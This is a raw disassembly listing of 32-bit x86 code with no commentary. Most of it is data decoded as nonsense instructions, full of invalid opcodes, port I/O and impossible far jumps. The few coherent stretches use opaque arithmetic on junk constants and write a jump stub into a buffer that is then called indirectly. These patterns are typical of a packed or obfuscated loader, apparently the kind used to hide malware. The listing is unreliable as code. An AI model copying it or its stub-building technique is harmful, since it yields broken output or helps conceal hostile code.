  40d547:	js     0x40d54b
  40d549:	and    BYTE PTR [edx-0x52a79a1d],cl
  40d54f:	inc    ebx
  40d550:	adc    BYTE PTR [ebx],0x24
  40d553:	data16 xchg al,ch
  40d556:	mov    cs,WORD PTR [edi-0x75]
  40d559:	pop    ebx
  40d55a:	sbb    BYTE PTR [ebx],bl
  40d55c:	fsub   DWORD PTR [ebx+0x42]
  40d55f:	fdiv   DWORD PTR [ebx+0x6ca79947]
  40d565:	push   0xeed92c09
  40d56a:	out    0x14,eax
  40d56c:	adc    esp,esp
  40d56e:	(bad)  
  40d570:	ret    
  40d571:	pop    edi
  40d572:	jne    0x40d594
  40d574:	pop    ss
  40d575:	(bad)  
  40d576:	and    BYTE PTR [esi+eiz*8-0x72],bl
  40d57a:	pop    edx
  40d57b:	push   ss
  40d57c:	jl     0x40d5eb
  40d57e:	adc    dh,cl
  40d580:	sub    DWORD PTR [eax+0x4],ebx
  40d583:	dec    bl
  40d585:	or     BYTE PTR fs:[ebx+0x3a],bh
  40d589:	adc    ah,cl
  40d58b:	mov    ebp,0x360deb7a
  40d590:	xlat   BYTE PTR ds:[ebx]
  40d591:	mov    bh,0xc4
  40d593:	pop    ebx
  40d594:	retf   
  40d595:	popf   
  40d596:	push   esp
  40d597:	(bad)  
  40d598:	and    ah,al
  40d59a:	mov    BYTE PTR [esi+0x7b],ch
  40d59d:	sbb    dh,BYTE PTR [ecx+0x4e]
  40d5a0:	dec    esi
  40d5a1:	sbb    al,0x32
  40d5a3:	cld    
  40d5a4:	mov    eax,DWORD PTR [ebp-0xc]
  40d5a7:	sub    ecx,eax
  40d5a9:	imul   ecx,ecx,0x7480
  40d5af:	add    ecx,DWORD PTR [ebp-0x58]
  40d5b2:	mov    eax,DWORD PTR [ebp-0x8]
  40d5b5:	push   ecx
  40d5b6:	mov    ecx,DWORD PTR [ebp-0x4]
  40d5b9:	lea    eax,[ecx+eax*1-0x1e6d]
  40d5c0:	mov    ecx,DWORD PTR [ebp-0x64]
  40d5c3:	xor    edx,edx
  40d5c5:	div    ecx
  40d5c7:	mov    ecx,DWORD PTR [ebp-0x74]
  40d5ca:	lea    eax,[eax+ecx*1-0xa617]
  40d5d1:	push   eax
  40d5d2:	mov    eax,DWORD PTR [ebp-0x88]
  40d5d8:	mov    ecx,DWORD PTR [ebp-0x84]
  40d5de:	push   0x770a
  40d5e3:	push   0x2a0c
  40d5e8:	push   ecx
  40d5e9:	push   eax
  40d5ea:	call   0x41594e
  40d5ef:	mov    ecx,DWORD PTR [ebp-0x98]
  40d5f5:	mov    esi,DWORD PTR [ebp-0x94]
  40d5fb:	push   esi
  40d5fc:	push   ecx
  40d5fd:	or     edx,0x615d
  40d603:	or     eax,0x455c
  40d608:	push   edx
  40d609:	push   eax
  40d60a:	call   0x422220
  40d60f:	mov    ecx,DWORD PTR [ebp-0x70]
  40d612:	mov    edx,DWORD PTR [ebp-0x6c]
  40d615:	xor    eax,ecx
  40d617:	mov    ecx,DWORD PTR [ebp-0x20]
  40d61a:	mov    edx,DWORD PTR [ebp-0x1c]
  40d61d:	mov    esi,DWORD PTR [ebp-0x80]
  40d620:	and    eax,0xb49
  40d625:	add    esi,0x629b
  40d62b:	lea    eax,[eax+ecx*1-0xfd]
  40d632:	xor    esi,0x4994
  40d638:	push   eax
  40d639:	lea    esi,[ebp+esi*1-0x3c93]
  40d640:	call   0x40dbf7
  40d645:	mov    ecx,eax
  40d647:	mov    eax,DWORD PTR [ebp-0x50]
  40d64a:	mov    edx,DWORD PTR [ebp-0x7c]
  40d64d:	sub    eax,0x161
  40d652:	xor    eax,edx
  40d654:	imul   eax,eax,0x5151
  40d65a:	add    eax,0x3901
  40d65f:	xor    eax,0x40c2
  40d664:	xor    edx,edx
  40d666:	mov    esi,0x218f6c45
  40d66b:	div    esi
  40d66d:	cmp    ecx,eax
  40d66f:	jne    0x40d7dc
  40d675:	mov    ecx,DWORD PTR [ebp-0x78]
  40d678:	xor    edx,edx
  40d67a:	mov    eax,0x209c
  40d67f:	div    ecx
  40d681:	mov    ecx,DWORD PTR ds:0x4226a8
  40d687:	mov    ecx,DWORD PTR [ecx+0x1a8]
  40d68d:	xor    edx,edx
  40d68f:	sub    ecx,eax
  40d691:	mov    eax,DWORD PTR [ebp-0x4c]
  40d694:	xor    eax,0x3daa
  40d699:	sub    eax,0x3375
  40d69e:	or     eax,0x6931
  40d6a3:	lea    eax,[ebp+eax*1-0x6c25]
  40d6aa:	push   eax
  40d6ab:	mov    eax,DWORD PTR [ebp-0x8c]
  40d6b1:	push   0x18
  40d6b3:	pop    esi
  40d6b4:	div    esi
  40d6b6:	mov    esi,DWORD PTR [ebp-0x60]
  40d6b9:	xor    edx,edx
  40d6bb:	div    esi
  40d6bd:	mov    edx,DWORD PTR [ebp-0x44]
  40d6c0:	mov    esi,DWORD PTR [ebp-0x34]
  40d6c3:	xor    eax,edx
  40d6c5:	xor    edx,edx
  40d6c7:	div    esi
  40d6c9:	imul   eax,eax,0x7d2a
  40d6cf:	sub    eax,0x928ded7
  40d6d4:	push   eax
  40d6d5:	mov    eax,ds:0x4226a8
  40d6da:	add    eax,0xaa
  40d6df:	push   eax
  40d6e0:	mov    eax,DWORD PTR [ebp-0x3c]
  40d6e3:	sub    ecx,eax
  40d6e5:	mov    eax,DWORD PTR [ebp-0x24]
  40d6e8:	push   DWORD PTR [ecx+eax*1+0xbd4]
  40d6ef:	call   0x41b447
  40d6f4:	mov    DWORD PTR [ebp-0x4],eax
  40d6f7:	mov    ecx,DWORD PTR ds:0x4227b0
  40d6fd:	lea    eax,[ebp+0x4]
  40d700:	mov    DWORD PTR [ecx*4+0x4227a8],eax
  40d707:	inc    DWORD PTR ds:0x4227b0
  40d70d:	mov    eax,DWORD PTR [ebp-0x4]
  40d710:	mov    eax,DWORD PTR [ebp-0x4]
  40d713:	xor    edx,edx
  40d715:	shld   edx,eax,0x2
  40d719:	shl    eax,0x2
  40d71c:	mov    ecx,0xcb79b576
  40d721:	mov    esi,0x9c2b8ae8
  40d726:	xor    eax,ecx
  40d728:	xor    edx,esi
  40d72a:	cmp    eax,ecx
  40d72c:	jne    0x40d746
  40d732:	cmp    edx,esi
  40d734:	jne    0x40d746
  40d73a:	mov    eax,0xcb79b572
  40d73f:	mov    edx,esi
  40d741:	jmp    0x40dbf1
  40d746:	lea    eax,[ebp-0x10]
  40d749:	mov    DWORD PTR [ebp-0x9c],eax
  40d74f:	mov    eax,DWORD PTR [ebp-0x54]
  40d752:	mov    DWORD PTR [ebp-0x10],eax
  40d755:	mov    eax,DWORD PTR [ebp-0x10]
  40d758:	mov    ecx,DWORD PTR [ebp-0x4]
  40d75b:	sub    eax,ecx
  40d75d:	mov    DWORD PTR [ebp-0x10],eax
  40d760:	mov    eax,DWORD PTR [ebp-0x20]
  40d763:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d766:	sub    DWORD PTR [ebp-0x10],eax
  40d769:	mov    eax,DWORD PTR [ebp-0x4]
  40d76c:	mov    DWORD PTR [eax],0x658776e9
  40d772:	mov    DWORD PTR [eax+0x4],0xab756547
  40d779:	mov    eax,DWORD PTR [ebp-0x10]
  40d77c:	mov    ecx,DWORD PTR [ebp-0x4]
  40d77f:	mov    DWORD PTR [ecx+0x1],eax
  40d782:	mov    eax,ds:0x422524
  40d787:	push   DWORD PTR [eax]
  40d789:	push   DWORD PTR ds:0x422798
  40d78f:	push   DWORD PTR ds:0x42252c
  40d795:	push   DWORD PTR ds:0x422778
  40d79b:	push   DWORD PTR ds:0x4227ec
  40d7a1:	push   0xa5069baa
  40d7a6:	push   0xa5069bae
  40d7ab:	push   DWORD PTR [ebp-0x5c]
  40d7ae:	mov    eax,DWORD PTR [ebp-0x4]
  40d7b1:	call   eax
  40d7b3:	mov    eax,DWORD PTR [edi]
  40d7b5:	mov    eax,DWORD PTR [ebp+0x8]
  40d7b8:	push   DWORD PTR [eax]
  40d7ba:	call   0x40e823
  40d7bf:	mov    eax,ds:0x4226a8
  40d7c4:	push   0x4
  40d7c6:	add    eax,0x1dc
  40d7cb:	push   eax
  40d7cc:	push   edi
  40d7cd:	call   0x411c08
  40d7d2:	mov    eax,0xcb79b57e
  40d7d7:	jmp    0x40d73f
  40d7dc:	mov    eax,0xcb79b576
  40d7e1:	mov    edx,0x9c2b8ae8
  40d7e6:	jmp    0x40dbf1
  40d7eb:	hlt    
  40d7ec:	scas   eax,DWORD PTR es:[edi]
  40d7ed:	je     0x40d848
  40d7ef:	mov    ah,0x9a
  40d7f1:	cld    
  40d7f2:	mov    eax,0x90d1c6c0
  40d7f7:	in     al,0x1d
  40d7f9:	dec    esi
  40d7fa:	sahf   
  40d7fb:	gs lock mov esi,0xbec492be
  40d802:	mov    esi,0x89097b80
  40d807:	and    eax,0x7dd5ec54
  40d80c:	dec    ecx
  40d80d:	cmp    ebx,DWORD PTR [esi+0x28]
  40d810:	dec    ebx
  40d811:	cld    
  40d812:	mov    ebx,0xd13e2fb0
  40d817:	xlat   BYTE PTR ds:[ebx]
  40d818:	xchg   esi,eax
  40d819:	pushf  
  40d81a:	or     eax,0xdf753afb
  40d81f:	imul   ecx,edi,0x2f92b79d
  40d825:	adc    al,0xa9
  40d827:	retf   0x7a5e
  40d82a:	push   ds
  40d82b:	imul   ecx,ebx,0x6b
  40d82e:	xor    ch,al
  40d830:	retf   
  40d831:	popa   
  40d832:	sub    DWORD PTR [edx-0x894c81a],0x4e
  40d839:	stos   BYTE PTR es:[edi],al
  40d83a:	cs cs popa 
  40d83d:	clc    
  40d83e:	les    ebx,FWORD PTR [ebx+0x12]
  40d841:	mov    al,ds:0x9bb5a659
  40d846:	in     al,0xde
  40d848:	push   edx
  40d849:	jge    0x40d892
  40d84b:	mov    al,0x33
  40d84d:	ins    BYTE PTR es:[edi],dx
  40d84e:	nop
  40d84f:	lods   eax,DWORD PTR ds:[esi]
  40d850:	cmp    esi,DWORD PTR [esi-0x1a]
  40d853:	nop
  40d854:	mov    ecx,DWORD PTR [ebp+edi*8-0x11ca49af]
  40d85b:	push   0xffffffee
  40d85d:	xchg   esi,eax
  40d85e:	call   0x1dd5bdad
  40d863:	paddq  mm1,mm2
  40d866:	push   ds
  40d867:	xor    ecx,DWORD PTR [eax-0x71504173]
  40d86d:	sbb    al,0xee
  40d86f:	cmp    al,0xfd
  40d871:	fnstsw WORD PTR [eax+0x6cdd1a64]
  40d877:	jecxz  0x40d8ea
  40d879:	mov    esi,0xbac95520
  40d87e:	fst    QWORD PTR [esi+0x71f6758d]
  40d884:	xchg   edx,eax
  40d885:	ret    0xa006
  40d888:	aaa    
  40d889:	call   0x5ad3cc21
  40d88e:	and    dh,ah
  40d890:	push   esi
  40d891:	jmp    0xe41a:0x9b5e6de1
  40d898:	int3   
  40d899:	push   esp
  40d89a:	pusha  
  40d89b:	mov    eax,ds:0xddae842b
  40d8a0:	jle    0x40d877
  40d8a2:	(bad)  
  40d8a3:	test   ecx,0xec5b1dec
  40d8a9:	mov    ds:0x2564afff,eax
  40d8ae:	pusha  
  40d8af:	imul   ebx,DWORD PTR [esi],0x7
  40d8b2:	enter  0x4e23,0x45
  40d8b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8b7:	rcl    DWORD PTR [edx-0x26],0xc6
  40d8bb:	push   edx
  40d8bc:	sub    al,0x5e
  40d8be:	pop    edi
  40d8bf:	ficomp DWORD PTR [ebx]
  40d8c1:	add    esi,DWORD PTR [edx-0x5bb23d77]
  40d8c7:	sub    ecx,DWORD PTR [eax+ebx*2]
  40d8ca:	stos   DWORD PTR es:[edi],eax
  40d8cb:	out    dx,eax
  40d8cc:	call   0x66cc:0x576fa798
  40d8d3:	imul   edi,DWORD PTR [esi+0x4a95233c],0x5a06098b
  40d8dd:	inc    edi
  40d8de:	fsubrp st(0),st
  40d8e0:	test   eax,0x7ac44a17
  40d8e5:	push   cs
  40d8e6:	loopne 0x40d90e
  40d8e8:	fwait
  40d8e9:	or     ah,BYTE PTR ds:[ebx-0x2f506834]
  40d8f0:	imul   ecx,esp,0x717b2858
  40d8f6:	mov    gs,edx
  40d8f8:	jne    0x40d8a9
  40d8fa:	and    DWORD PTR [edi+0x2c],edi
  40d8fd:	and    eax,0x4882d8ff
  40d902:	test   al,0x27
  40d904:	jmp    0xdf35:0x1938e92e
  40d90b:	mov    dl,0x20
  40d90d:	or     eax,0x31e02d73
  40d912:	data16 or al,0x2f
  40d915:	je     0x40d8bf
  40d917:	cmp    DWORD PTR [esi+0x5bbbac30],0x38
  40d91e:	xchg   edi,eax
  40d91f:	fisub  DWORD PTR [edx]
  40d921:	mov    ebx,0x48a799fe
  40d926:	inc    ebp
  40d927:	xchg   eax,edi
  40d929:	mov    bh,0x21
  40d92b:	sbb    DWORD PTR [edx],esi
  40d92d:	sbb    eax,0x38231d94
  40d932:	push   ecx
  40d933:	out    dx,al
  40d934:	rol    dl,0x23
  40d937:	(bad)  
  40d938:	(bad)  
  40d93a:	les    ebp,FWORD PTR [esp+ebx*1+0x759b89f8]
  40d941:	or     dl,BYTE PTR [eax]
  40d943:	jle    0x40d914
  40d945:	repnz mov ds:0xfdea9976,eax
  40d94b:	or     al,0x27
  40d94d:	push   0x5db70a30
  40d952:	mov    ds:0x39485ed8,al
  40d957:	xchg   ecx,eax
  40d958:	call   0x9341:0x621e1265
  40d95f:	ficomp WORD PTR ds:0x97dad168
  40d965:	pop    eax
  40d966:	stos   BYTE PTR es:[edi],al
  40d967:	mov    cl,0x4
  40d969:	psraw  mm1,mm0
  40d96c:	sbb    ebp,ebx
  40d96e:	push   0x4533f4e9
  40d973:	in     al,dx
  40d974:	clc    
  40d975:	(bad)  
  40d976:	and    dl,dl
  40d978:	cli    
  40d979:	popa   
  40d97a:	popa   
  40d97b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d97c:	mov    dh,0x91
  40d97e:	mov    WORD PTR [edi],cs
  40d980:	aaa    
  40d981:	or     al,0x14
  40d983:	inc    edx
  40d984:	mov    eax,ds:0xb4119746
  40d989:	cld    
  40d98a:	dec    ebp
  40d98b:	xchg   edi,eax
  40d98c:	add    eax,0x8f85f20b
  40d991:	es icebp 
  40d993:	push   ds
  40d994:	fistp  WORD PTR [ecx-0x29]
  40d997:	adc    ebx,DWORD PTR [ecx]
  40d999:	arpl   WORD PTR [edi],bx
  40d99b:	enter  0xd919,0x25
  40d99f:	icebp  
  40d9a0:	test   al,0x66
  40d9a2:	ins    DWORD PTR es:[edi],dx
  40d9a3:	ja     0x40d9bc
  40d9a5:	jne    0x40d9b9
  40d9a7:	inc    ecx
  40d9a8:	fnstsw WORD PTR [edi+esi*2+0x3630401c]
  40d9af:	push   ds
  40d9b0:	adc    DWORD PTR [esi-0x2f2aacf6],ebp
  40d9b6:	(bad)  
  40d9b7:	jmp    0x9848:0xa4d3fcbd
  40d9be:	bound  ebx,QWORD PTR [edi]
  40d9c0:	jge    0x40d9ca
  40d9c2:	ja     0x40da39
  40d9c4:	mov    eax,0x6da41057
  40d9c9:	jle    0x40d995
  40d9cb:	mov    dl,0x93
  40d9cd:	and    al,0x12
  40d9cf:	add    al,0xb6
  40d9d1:	stos   BYTE PTR es:[edi],al
  40d9d2:	sub    DWORD PTR [edi+0x1a],esi
  40d9d5:	jmp    0x7fcc1a82
  40d9da:	fidivr DWORD PTR [ebx]
  40d9dc:	std    
  40d9dd:	dec    esi
  40d9de:	sub    esp,esi
  40d9e0:	es mov edx,0xef8b790d
  40d9e6:	pop    ss
  40d9e7:	xchg   ecx,eax
  40d9e8:	fucomip st,st(6)
  40d9ea:	push   ebp
  40d9eb:	adc    DWORD PTR [edi+0x75],ebx
  40d9ee:	dec    ebp
  40d9ef:	es fdiv st(5),st
  40d9f2:	scas   al,BYTE PTR es:[edi]
  40d9f3:	repz ss and eax,0x19913de4
  40d9fa:	mov    eax,ds:0x5f507850
  40d9ff:	jge    0x40d9f2
  40da01:	mov    ebp,0x52e5f160
  40da06:	jnp    0x40da75
  40da08:	mov    ds:0xaa358ad4,eax
  40da0d:	inc    edx
  40da0e:	xor    al,0xbe
  40da10:	jecxz  0x40d9c6
  40da12:	cmc    
  40da13:	pop    ss
  40da14:	jne    0x40da1d
  40da16:	clc    
  40da17:	jae    0x40d9f7
  40da19:	add    BYTE PTR [esi],dh
  40da1b:	jge    0x40da68
  40da1d:	adc    DWORD PTR [ebx+0x6],edx
  40da20:	dec    eax
  40da21:	cmp    ebx,DWORD PTR [edx+0x67]
  40da24:	scas   al,BYTE PTR es:[edi]
  40da25:	in     eax,0xb6
  40da27:	or     cl,0xf2
  40da2a:	rol    DWORD PTR [ebp+0x16455],0xde
  40da31:	add    al,0xfe
  40da33:	push   edx
  40da34:	repnz imul ecx,DWORD PTR [ecx-0x5],0x4698fdbb
  40da3c:	or     BYTE PTR [edx-0x4f],bh
  40da3f:	jp     0x40da35
  40da41:	cld    
  40da42:	lods   eax,DWORD PTR ds:[esi]
  40da43:	and    esi,DWORD PTR [eax+0x6]
  40da46:	lahf   
  40da47:	mov    al,0x4f
  40da49:	push   ebx
  40da4a:	stos   BYTE PTR es:[edi],al
  40da4b:	lock outs dx,WORD PTR ds:[esi]
  40da4e:	test   al,0x72
  40da50:	mov    al,ds:0xaa7608d7
  40da55:	sub    BYTE PTR [bp-0x5d34],al
  40da5a:	ins    DWORD PTR es:[edi],dx
  40da5b:	jno    0x40da45
  40da5d:	inc    eax
  40da5e:	mov    ecx,0x6cfb568
  40da63:	mov    ecx,0xb3bfeec5
  40da68:	ins    DWORD PTR es:[edi],dx
  40da69:	jmp    0xde00:0x6296962a
  40da70:	popa   
  40da71:	test   DWORD PTR [eax+0x3d6ffee],ebx
  40da77:	jmp    0x1596:0x484e6634
  40da7e:	mov    DWORD PTR [ecx-0x488a296d],ebp
  40da84:	addr16 jno 0x40daf6
  40da87:	ss dec edx
  40da89:	loopne 0x40dab6
  40da8b:	jge    0x40dab4
  40da8d:	or     eax,0xa25c2a3d
  40da92:	push   ebp
  40da93:	add    bl,BYTE PTR [edx+0x48d5568f]
  40da99:	push   0x91b276bf
  40da9e:	sbb    DWORD PTR ds:0xd33377d2,esi
  40daa4:	adc    DWORD PTR [ebp+0x176a23bf],eax
  40daaa:	mov    eax,ds:0x14d79084
  40daaf:	enter  0xb0c4,0xf1
  40dab3:	jmp    0x3995:0xbb95d436
  40daba:	fistp  DWORD PTR ds:0x5fe9bb44
  40dac0:	cmp    bh,BYTE PTR [ecx]
  40dac2:	or     BYTE PTR [eax+0x6c],al
  40dac5:	inc    ebx
  40dac6:	push   ds
  40dac7:	sub    al,0xf2
  40dac9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daca:	sub    eax,0x159aed7d
  40dacf:	jl     0x40db00
  40dad1:	push   esi
  40dad2:	xor    DWORD PTR [esi-0x18],edx
  40dad5:	leave  
  40dad6:	and    ch,ah
  40dad8:	sti    
  40dad9:	outs   dx,DWORD PTR ds:[esi]
  40dada:	(bad)  
  40dadb:	xor    bh,BYTE PTR [eax+0x2]
  40dade:	ds jb  0x40db46
  40dae1:	(bad)  
  40dae2:	aam    0xc9
  40dae4:	sar    BYTE PTR [ebx-0xe],1
  40dae7:	enter  0x6739,0x74
  40daeb:	pop    eax
  40daec:	lods   al,BYTE PTR ds:[esi]
  40daed:	inc    ebx
  40daee:	inc    eax
  40daef:	sbb    cl,BYTE PTR fs:[ecx-0x3]
  40daf3:	mov    ch,0xe
  40daf5:	into   
  40daf6:	lahf   
  40daf7:	inc    si
  40daf9:	xchg   DWORD PTR [edi-0x46a46d2e],esp
  40daff:	jb     0x40db1d
  40db01:	mov    WORD PTR ds:0x6c61f1ec,es
  40db07:	stos   DWORD PTR es:[edi],eax
  40db08:	retf   0x7eac
  40db0b:	jae    0x40db5d
  40db0d:	rcr    BYTE PTR [esi+0x1b],1
  40db10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db11:	mov    edi,0x793a677e
  40db16:	mov    ah,0x1c
  40db18:	inc    esp
  40db19:	pop    esi
  40db1a:	adc    ecx,DWORD PTR [ebx+eiz*2+0x25]
  40db1e:	sbb    edi,DWORD PTR [esi+0xe4803be]
  40db24:	dec    ebx
  40db25:	test   BYTE PTR [edx-0x6318d5f],bl
  40db2b:	lods   al,BYTE PTR ds:[esi]
  40db2c:	or     eax,0x2c47d0a2
  40db31:	cdq    
  40db32:	xchg   esi,eax
  40db33:	fimul  DWORD PTR [edx]
  40db35:	xlat   BYTE PTR ds:[ebx]
  40db36:	jmp    0x68e1:0x39b6307
  40db3d:	xor    ch,BYTE PTR [ebx-0x6e]
  40db40:	test   eax,0xbbb1c143
  40db45:	jl     0x40db9d
  40db47:	les    eax,FWORD PTR [eax]
  40db49:	xchg   esp,eax
  40db4a:	inc    esp
  40db4b:	retf   
  40db4c:	leave  
  40db4d:	fistp  QWORD PTR [edx]
  40db4f:	sbb    ebx,DWORD PTR [esi-0x6e3d023a]
  40db55:	(bad)  
  40db56:	cmp    edx,ebp
  40db58:	mov    edi,0x59cefbe3
  40db5d:	mov    ch,0x3d
  40db5f:	cli    
  40db60:	sbb    al,ch
  40db62:	es nop
  40db64:	jno    0x40db15
  40db66:	xchg   BYTE PTR [esi-0x13c0ee99],ch
  40db6c:	pusha  
  40db6d:	mov    cl,0x33
  40db6f:	mov    BYTE PTR [eax-0x5e],dl
  40db72:	dec    ebx
  40db73:	and    eax,0xd3a88193
  40db78:	shl    BYTE PTR [eax-0x71],1
  40db7b:	gs repz pop ss
  40db7e:	mov    al,0x4f
  40db80:	cmp    edx,edx
  40db82:	sub    ebp,DWORD PTR [edx+0x66]
  40db85:	pop    edi
  40db86:	fucom  st(5)
  40db88:	sub    ah,BYTE PTR [ebp+eiz*4-0x36]
  40db8c:	pop    ss
  40db8d:	jp     0x40db8d
  40db8f:	(bad)  
  40db91:	dec    edi
  40db92:	mov    ds:0xd7054a58,eax
  40db97:	retf   
  40db98:	add    al,dl
  40db9a:	inc    edx
  40db9b:	(bad)  
  40db9c:	or     eax,0x87187932
  40dba1:	ins    BYTE PTR es:[edi],dx
  40dba2:	push   edi
  40dba3:	mov    esi,0x77c98731
  40dba8:	push   es
  40dba9:	gs pop esp
  40dbab:	in     eax,0xf
  40dbad:	cmp    ah,BYTE PTR [ecx+0x14]
  40dbb0:	clc    
  40dbb1:	push   0x5e
  40dbb3:	les    esp,FWORD PTR [esi-0x776873b9]
  40dbb9:	inc    eax
  40dbba:	xor    eax,ecx
  40dbbc:	adc    eax,0xbe09593b
  40dbc1:	cmp    BYTE PTR [eax+eax*1-0x1],0x4d
  40dbc6:	aas    
  40dbc7:	push   es
  40dbc8:	data16 out 0x82,al
  40dbcb:	int    0xd0
  40dbcd:	cmp    al,0x1
  40dbcf:	loope  0x40db9e
  40dbd1:	inc    esi
  40dbd2:	fsubr  st,st(5)
  40dbd4:	aad    0x22
  40dbd6:	ficomp WORD PTR [eax-0x78b1a3a0]
  40dbdc:	retf   0x9698
  40dbdf:	dec    ebp
  40dbe0:	lahf   
  40dbe1:	push   es
  40dbe2:	pusha  
  40dbe3:	mov    edi,0x7729f6ac
  40dbe8:	call   0xccc4:0x9ab07ac3
  40dbef:	ins    DWORD PTR es:[edi],dx
  40dbf0:	test   eax,0xc2c95b5e
  40dbf5:	add    al,0x0
  40dbf7:	push   ebp
  40dbf8:	mov    ebp,esp
  40dbfa:	sub    esp,0x20
  40dbfd:	push   ebx
  40dbfe:	push   edi
  40dbff:	mov    DWORD PTR [ebp-0x8],0x522e
  40dc06:	mov    DWORD PTR [ebp-0x4],0x3dbd
  40dc0d:	mov    DWORD PTR [ebp-0x10],0x53f1
  40dc14:	mov    DWORD PTR [ebp-0xc],0x631b
  40dc1b:	jmp    0x40deaa
  40dc20:	dec    ebx
  40dc21:	pop    esi
  40dc22:	xchg   ebp,eax
  40dc23:	idiv   DWORD PTR [eax+edi*1-0x2a408d55]
  40dc2a:	push   ss
  40dc2b:	rcl    DWORD PTR [eax],1
  40dc2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc2e:	ins    BYTE PTR es:[edi],dx
  40dc2f:	sar    DWORD PTR [ecx],1
  40dc31:	clc    
  40dc32:	mov    esi,0xbec299be
  40dc37:	mov    esi,0xd97357ce
  40dc3c:	and    ch,BYTE PTR [edx]
  40dc3e:	mov    DWORD PTR [esi+0x1f],edi
  40dc41:	add    cl,BYTE PTR [edx+0x648d57f9]
  40dc47:	mov    ds:0x169226be,eax
  40dc4c:	sbb    ecx,DWORD PTR [edx]
  40dc4e:	adc    edi,DWORD PTR [edx-0x70]
  40dc51:	outs   dx,DWORD PTR ds:[esi]
  40dc52:	cmp    eax,DWORD PTR [ecx-0x7d6f0c17]
  40dc58:	and    ah,BYTE PTR [ebx-0x1]
  40dc5b:	lods   al,BYTE PTR ds:[esi]
  40dc5c:	adc    ecx,DWORD PTR [edi-0x4f]
  40dc5f:	jg     0x40dc04
  40dc61:	mov    edx,DWORD PTR [eax-0x15]
  40dc64:	fs retf 0xc655
  40dc68:	sbb    edi,DWORD PTR fs:[ecx+edx*2+0x6b]
  40dc6d:	aam    0xe3
  40dc6f:	enter  0xbcba,0x99
  40dc73:	repz mov cs,WORD PTR [esi]
  40dc76:	leave  
  40dc77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc78:	out    dx,eax
  40dc79:	and    eax,0xb16c0ba4
  40dc7e:	int    0x6b
  40dc80:	xor    DWORD PTR [ebp+ebp*8+0x74403805],ebp
  40dc87:	(bad)  
  40dc88:	push   esi
  40dc89:	mov    dl,0x1e
  40dc8b:	stos   BYTE PTR es:[edi],al
  40dc8c:	jle    0x40dc39
  40dc8e:	test   eax,0xd5962394
  40dc93:	jo     0x40dcfa
  40dc95:	mov    esi,0xac116100
  40dc9a:	mov    ah,0xfd
  40dc9c:	xor    eax,DWORD PTR [esi]
  40dc9e:	icebp  
  40dc9f:	or     eax,0x88e01916
  40dca4:	and    bl,BYTE PTR [edx]
  40dca6:	mov    ds:0x1c2a9e71,eax
  40dcab:	test   BYTE PTR [ebx+eiz*4],al
  40dcae:	dec    eax
  40dcaf:	inc    edx
  40dcb0:	add    eax,0x5fd15fc9
  40dcb5:	and    DWORD PTR [ecx+0x6e8c601a],esp
  40dcbb:	ret    0x21ec
  40dcbe:	call   0x1981:0x4e73c389
  40dcc5:	or     eax,0xe4844c14
  40dcca:	pop    ebx
  40dccb:	icebp  
  40dccc:	rep outs dx,DWORD PTR ds:[esi]
  40dcce:	sbb    ebp,DWORD PTR [ebx-0x6f]
  40dcd1:	mov    eax,ds:0xdfb7a622
  40dcd6:	mov    esp,0x3ac21a1b
  40dcdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcdc:	(bad)  
  40dcdd:	cli    
  40dcde:	stc    
  40dcdf:	dec    ebx
  40dce0:	pop    esp
  40dce1:	and    eax,0x284c3a78
  40dce6:	(bad)  
  40dce7:	adc    ch,dl
  40dce9:	mov    ecx,0x8f417f35
  40dcee:	mov    BYTE PTR [eax],dh
  40dcf0:	mov    ecx,0xa46f6e2a
  40dcf5:	xor    DWORD PTR [ebx+ebp*4-0x449f34cb],eax
  40dcfc:	dec    edi
  40dcfd:	adc    esi,edx
  40dcff:	pop    edi
  40dd00:	fmul   DWORD PTR [edi-0x2f]
  40dd03:	lods   eax,DWORD PTR ds:[esi]
  40dd04:	push   edx
  40dd05:	retf   
  40dd06:	int    0xc0
  40dd08:	push   ecx
  40dd09:	mov    bl,0xe4
  40dd0b:	and    eax,0x66c3def0
  40dd10:	out    dx,al
  40dd11:	sub    ebx,DWORD PTR [ebp-0x55]
  40dd14:	sbb    DWORD PTR [ebx],ebx
  40dd16:	cmp    al,0x4b
  40dd18:	(bad)  
  40dd19:	and    bl,BYTE PTR [ebx+ecx*1]
  40dd1c:	mov    edi,0x9b338a16
  40dd21:	je     0x40dcd7
  40dd23:	xor    al,0x20
  40dd25:	jne    0x40dd37
  40dd27:	pop    ss
  40dd28:	cwde   
  40dd29:	or     BYTE PTR [esi+0x20],bh
  40dd2c:	mov    cl,0xc1
  40dd2e:	xchg   esp,eax
  40dd2f:	or     DWORD PTR [eax+edi*4+0x257c880],ebp
  40dd36:	mov    eax,0x592b71c3
  40dd3b:	sbb    eax,0xca213bde
  40dd40:	in     al,dx
  40dd41:	frstor ds:[eax+0x27]
  40dd45:	ja     0x40dd21
  40dd47:	push   ebp
  40dd48:	fmul   DWORD PTR [edi-0x26]
  40dd4b:	mov    esi,0x9716794b
  40dd50:	out    dx,eax
  40dd51:	cs xor DWORD PTR gs:[ebx+0x5556f656],ecx
  40dd59:	jbe    0x40dd4e
  40dd5b:	mov    edx,0xeec04386
  40dd60:	pop    ebp
  40dd61:	pop    eax
  40dd62:	mov    edi,0x82a76a63
  40dd67:	mov    dl,0xb
  40dd69:	xor    al,0x42
  40dd6b:	mov    BYTE PTR [ebp+0x5950b602],cl
  40dd71:	mov    ebp,0x9b943a05
  40dd76:	cmp    DWORD PTR [esi-0x45],0xd26eef2a
  40dd7d:	leave  
  40dd7e:	test   eax,0x5859beda
  40dd83:	(bad)  
  40dd85:	and    eax,0x71b64a5d
  40dd8a:	std    
  40dd8b:	out    0xc8,eax
  40dd8d:	sub    eax,0x384292f
  40dd92:	inc    edi
  40dd93:	sbb    DWORD PTR [ecx-0x31],esp
  40dd96:	xchg   esi,eax
  40dd97:	sbb    edx,DWORD PTR [edx+0x10f38175]
  40dd9d:	push   ebx
  40dd9e:	add    cl,BYTE PTR fs:[eax-0x62014e63]
  40dda5:	push   ss
  40dda6:	and    dl,cl
  40dda8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
